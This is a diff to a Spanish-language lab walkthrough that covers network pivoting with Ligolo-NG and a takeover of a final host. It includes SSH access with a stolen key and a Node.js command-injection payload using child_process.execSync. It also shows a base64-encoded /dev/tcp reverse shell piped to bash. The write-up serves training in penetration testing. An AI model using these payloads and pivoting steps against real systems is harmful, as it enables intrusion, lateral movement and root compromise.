@@ -859,13 +859,13 @@ El resultado confirma la existencia de la clave privada del usuario.
 🚪 Acceso mediante SSH
 
 Una vez obtenida la clave privada, se guarda localmente y se ajustan permisos:
-```
+```ruby
 mousepad node-id_rsa
 chmod 600 node-id_rsa
 ssh -i node-id_rsa node@30.30.30.3 -p 2222
 ```
 Se acepta la huella del host y se valida el acceso:
-```
+```ruby
 whoami
 id
 hostname
@@ -875,7 +875,203 @@ hostname
 A través del análisis de la aplicación web se logró:
 
 Identificar una cookie manipulable codificada en Base64
+
 Detectar una vulnerabilidad de Directory Traversal
+
 Leer archivos arbitrarios del sistema
+
+# Pivoting 3 (30.30.30.0/24 -> 40.40.40.0/24)
+
+En este punto, se detecta que esta máquina pertenece a dos redes diferentes. Se comprueba en este caso a través del archivo “/etc/hosts” (no se ha encontrado otra forma de comprobarlo en este caso) que el nombre de la máquina “Node” está asociada a dos direcciones IP de dos redes diferentes.
+```ruby
+cat /etc/hosts
+```
+<img width="394" height="158" alt="image" src="https://github.com/user-attachments/assets/defff081-ed1e-44c0-9f25-cd8d31e332cc" />
+
+
 Extraer credenciales sensibles (clave privada SSH)
 Obtener acceso al sistema mediante SSH
+
+Al haber comprometido esta máquina, es posible utilizarla como “pivote” para poder detectar nuevos sistemas en la otra red a la que pertenece (en este caso, para acceder a la siguiente máquina del ejercicio). Por ello, vamos a hacer que la máquina “Node” sea el tercer “pivote” de este ejercicio.
+
+Para que el agente de este nuevo “pivote” pueda detectar el servicio que expone el proxy y conectarse a él, es necesario configurar una nueva redirección para el puerto 11601 (el servicio a la escucha del proxy de Ligolo-NG) usando la sesión activa del segundo “pivote”. De esta forma, el nuevo agente podrá conectarse al proxy a través de la redirección establecida por el segundo “pivote”.
+
+Además, se aprovecha esta visita al proxy y también se redirigen los otros puertos reservados para consola inversa (puerto 1337) y transferencia de ficheros (puerto 8008).
+```ruby
+desde el proxy, seleccionando la segunda sesión
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (proxy puerto 11601 <-> agente puerto 11601)
+listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp (proxy puerto 1337 <-> agente puerto 1337)
+listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp (proxy puerto 8008 <-> agente puerto 8008)
+listener_list
+```
+
+<img width="1146" height="317" alt="image" src="https://github.com/user-attachments/assets/454a3fa9-dd13-4188-82a1-9580e6bc3328" />
+
+A continuación se conectará la máquina “pivote” al proxy mediante el agente descargado. Para ello, se transfiere el agente a la máquina, se le asignan permisos de ejecución y se le indica que se conecte al servicio del proxy que se encuentra a la escucha. En este caso, apuntando a la dirección IP del segundo “pivote”, ya que es el encargado de redirigir el puerto y hacerlo visible para el tercero.
+
+(nueva consola en máquina de trabajo)
+python3 -m http.server 8008 (levantar un servidor HTTP en el directorio donde se encuentra el binario del agente descargado, usando el puerto 8008 para hacer visibles los recursos, ya que ya se está redirigiendo a través del segundo "pivote")
+```ruby
+(en la tercera máquina "pivote")
+cd /tmp
+wget http://30.30.30.2:8008/agent (descargar el agente en la tercera máquina "pivote")
+ls -al agent
+chmod +x agent
+./agent -connect 30.30.30.2:11601 -ignore-cert (inidicar al agente que se conecte al proxy, apuntando al puerto redirigido a través de la segunda máquina "pivote")
+```
+
+El agente indica que se ha establecido una conexión. Al volver al proxy, se puede comprobar que este la ha recibido correctamente.
+
+```ruby
+[Agent : app@db5ee3b6cabc] » INFO[8233] Agent joined.    id=02421e1e1e03 name=node@a580ec7bcc54 remote="127.0.0.1:54264"
+```
+
+<img width="1265" height="22" alt="image" src="https://github.com/user-attachments/assets/3a2b29bb-f9b0-4534-bf94-e59fe4bd94df" />
+
+
+El siguiente paso consiste en seleccionar la sesión recientemente iniciada y comprobar las interfaces de red de la máquina “pivote”.
+```ruby
+En el proxy
+session (seleccionar la 3)
+ifconfig
+```
+
+Una vez conocida la dirección CIDR de la nueva red, es necesario crear una nueva interfaz TUN en la máquina de trabajo para poder redirigir el tráfico de red a esta.
+```ruby
+sudo ip tuntap add user root mode tun ligolo3 (crear la interfaz TUN llamada "ligolo3")
+sudo ip link set ligolo3 up (levanta la interfaz de red creada)
+ip link show ligolo3 (comprobar el estado de la interfaz)
+```
+
+El siguiente paso consiste en actualizar la tabla de enrutamiento para que el tráfico de la nueva red se enrute a través de la interfaz “ligolo3”.
+```
+sudo ip route add 40.40.40.0/24 dev ligolo3 (asociar la dirección CIDR de la nueva red a la interfaz "ligolo3" en la tabla de enrutamiento)
+ip route list (listar la tabla de enrutamiento actualizada)
+```
+
+<img width="672" height="129" alt="image" src="https://github.com/user-attachments/assets/704dd65a-fd25-463a-9201-3d04c5c3d7a1" />
+
+Una vez hecho esto, desde el proxy se da la instrucción para, usando la sesión activa, iniciar el túnel de red a través de la interfaz “ligolo3”. Esto se hace para permitir enrutar tráfico hacia la red del agente.
+
+<img width="539" height="38" alt="image" src="https://github.com/user-attachments/assets/d5d13d7c-1dc0-4cfe-a700-03e139b35cc9" />
+
+
+Al realizar esta operación, quedaría comprobar si la siguiente máquina perteneciente a la nueva red es accesible. Para ello, se realiza un ping y se comprueba su TTL, tal y como se ha hecho con la anterior.
+```
+ping 40.40.40.3 -c 1
+```
+<img width="492" height="146" alt="image" src="https://github.com/user-attachments/assets/b9a8fc6d-334a-473d-a8f2-7e8c5c14de35" />
+
+
+Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux. Por lo que, es posible continuar de forma normal con el siguiente reconocimiento inicial.
+Reconocimiento inicial (máquina “Administration”, 40.40.40.3)
+
+Se realiza un reconocimiento de los servicios disponibles en dos fases. En la primera, se realiza un escaneo de todos los puertos TCP usando nmap para detectar en primera instancia cuales de ellos son accesibles (open), utilizando un escaneo TCP Connect. En el segundo reconocimiento inicial se explica por qué en este caso se realiza un escaneo en modo TCP Connect en lugar de TCP SYN.
+```ruby
+sudo nmap -sT -p- -n -Pn 40.40.40.3
+```
+<img width="565" height="188" alt="image" src="https://github.com/user-attachments/assets/5b018c6c-6f9c-48f3-8650-0d3ae9bfc9a1" />
+
+En la segunda, se realiza un reconocimiento básico de los servicios subyacentes también mediante el uso de nmap. Esta vez, realizando dicha tarea de reconocimiento únicamente en los puertos detectados como abiertos.
+```ruby
+nmap -sCV -p 9999 -n -Pn 40.40.40.3 -oN services-40.40.40.3
+```
+<img width="806" height="176" alt="image" src="https://github.com/user-attachments/assets/ff6f80ec-ab8e-4897-91ac-3cce0aeb49a3" />
+En este caso, se omite el escaneo de puertos UDP, ya que para esta máquina en particular no tiene ningún servicio relevante para llevar a cabo el ejercicio.
+
+## Acceso inicial (root, máquina “Administration”, 40.40.40.3)
+
+En este caso se detecta que hay un puerto abierto:
+
+    Puerto 9999 (servicio HTTP, Node.js/Express)
+
+Tras investigar el servicio en el puerto 9999 disponible en esta máquina, parece que devuelve un mensaje al intentar acceder desde el navegador.
+
+URL -> http://40.40.40.3:9999
+
+message: "Only POST available"
+
+<img width="608" height="212" alt="image" src="https://github.com/user-attachments/assets/661910fc-7e2b-4454-b340-103bc42a9235" />
+
+Esto significa que cualquier petición que se haga mediante el método GET a este servicio recibirá una respuesta similar. Por ello, se prueba a realizar una petición con cURL usando el método POST para comprobar el resultado obtenido.
+```RUBY
+curl -X POST -s http://40.40.40.3:9999/ | jq (se usa "jq" para que salga más legible la respuesta en formato JSON)
+````
+<img width="503" height="453" alt="image" src="https://github.com/user-attachments/assets/0e3976c2-cb1c-4c02-aaa5-c6b21ac3452f" />
+
+El error que figura en la respuesta da una pista de que quizá se puedan ejecutar comandos de alguna manera. Por ello, se comprueba la existencia de algún parámetro POST que realice esto. Y efectivamente, se detecta un parámetro POST denominado “id”.
+```ruby
+ffuf -X POST -u "http://40.40.40.3:9999" -d '{"FUZZ":"app"}' -H "Content-Type: application/json" -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" -fs 181
+```
+<img width="1401" height="481" alt="image" src="https://github.com/user-attachments/assets/67b8e5a9-0c3e-4c1b-aa2a-efa7b69f8ccc" />
+
+Se confirma la función de ese parámetro realizando una petición cURL incluyéndolo en esta. Sin embargo, esta vez devuelve un nuevo error, indicando la imposibilidad de ejecutar código, ya que “app” no está definido.
+```ruby
+curl -X POST -s http://40.40.40.3:9999/ -d '{"id":"app"}' -H "Content-Type: application/json" | jq
+```
+result: Error executing code: app is not defined
+
+<img width="869" height="465" alt="image" src="https://github.com/user-attachments/assets/8caa893e-599a-42a7-8961-d0a62130e91e" />
+
+
+Tal y como indica los resultados de nmap, el recurso accesible tras este puerto es una aplicación escrita en Node.js. Por ello, se utiliza una carga útil en este lenguaje para intentar ejecutar comandos del sistema. Se incluye en la petición, sustituyendo el valor “app” por esta. La respuesta a esa petición resulta en una ejecución de comandos del sistema satisfactoria.
+```
+curl -X POST -s http://40.40.40.3:9999/ -d '{"id":"require(\"child_process\").execSync<ENTRE PARÉNTESIS Y ENTRE COMILLAS ESCAPADAS EL COMANDO QUE QUIERAS>.toString()"}' -H "Content-Type: application/json" | jq
+```
+
+Antes de poder ejecutar una petición para establecer una consola inversa (reverse shell), es necesario realizar unas configuraciones en el proxy de Ligolo-NG para poder tener acceso a ciertos recursos. Por ello, se van a realizar las configuraciones en el proxy que ya se venían haciendo, pero esta vez en el tercer “pivote”.
+
+Se redirigen los 3 puertos, para demostrar que en el caso de que fuera necesario continuar pivotando sería posible siguiendo la misma técnica, y también para poder establecer la consola inversa con la última de la máquinas.
+```ruby
+(en el proxy, desde la sesión activa correspondiente)
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (proxy puerto 11601 <-> agente puerto 11601)
+listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp (proxy puerto 1337 <-> agente puert 1337)
+listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp (proxy puerto 8008 <-> agente puerto 8008)
+listener_list (comprobar redirecciones realizadas)
+Por ejemplo, ejecutar comando "id": Sustituir el comentario por lo siguiente -> (\"id\")
+```
+<img width="732" height="239" alt="image" src="https://github.com/user-attachments/assets/2aae1f55-99ed-4b8b-ae0a-3db830e07c4b" />
+
+En este punto, se establece el puerto 1337 a la escucha, ya que es el puerto que se ha reservado desde los distintos agentes para establecer una consola inversa, de tal forma que lo que reciba cada agente con las redirecciones definidas, será redirigido hasta terminar en este puerto a la escucha en la máquina de trabajo.
+```
+rlwrap nc -nvlp 1337
+```
+<img width="535" height="88" alt="image" src="https://github.com/user-attachments/assets/ff53e16b-a77e-4975-8770-975d20135f2d" />
+
+Una vez hecho esto, se codifica en Base64 una carga útil y se ejecuta de la misma forma que el comando “id”.
+```ruby
+echo "sh -i >& /dev/tcp/40.40.40.2/1337 0>&1" | base64
+curl -X POST -s http://40.40.40.3:9999/ -d '{"id":"require(\"child_process\").execSync<ENTRE PARÉNTESIS Y ENTRE COMILLAS ESCAPADAS EL COMANDO DE LA CARGA ÚTIL>.toString()"}' -H "Content-Type: application/json" | jq
+Elemento a incluir: Sustituir el comentario por lo siguiente -> (\"echo <TU CARGA ÚTIL CODIFICADO EN BASE64> | base64 -d | bash\")
+```
+
+Esta ejecución resulta en un acceso instantáneo al sistema a través del puerto a la escucha que se ha puesto en la máquina de trabajo, capturando una consola del sistema con acceso al usuario “root”.
+```ruby
+whoami
+id
+hostname
+cat /etc/hosts
+```
+<img width="401" height="164" alt="image" src="https://github.com/user-attachments/assets/844c4274-872d-4cda-bae1-8000441fb992" />
+
+A continuación se actualiza la consola actual a una interactiva usando Python.
+
+```ruby
+tty (not a tty)
+python3 --version (instalado)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+tty (/dev/pts/0)
+```
+<img width="426" height="136" alt="image" src="https://github.com/user-attachments/assets/d64d1585-05ec-43e6-9c68-2a0da56afd2b" />
+
+Para finalizar, se obtiene la flag del usuario “root” en la última de las máquinas de este laboratorio.
+
+```
+cd /root
+ls -al
+cat IDadministrator.txt
+```
+
+<img width="578" height="203" alt="image" src="https://github.com/user-attachments/assets/e780421a-5590-44c0-91b1-203a008b0c5f" />
+
+En este punto, al haber obtenido acceso a la cuenta “root” en la última máquina de este laboratorio, se ha conseguido completar el objetivo propuesto para este laboratorio.
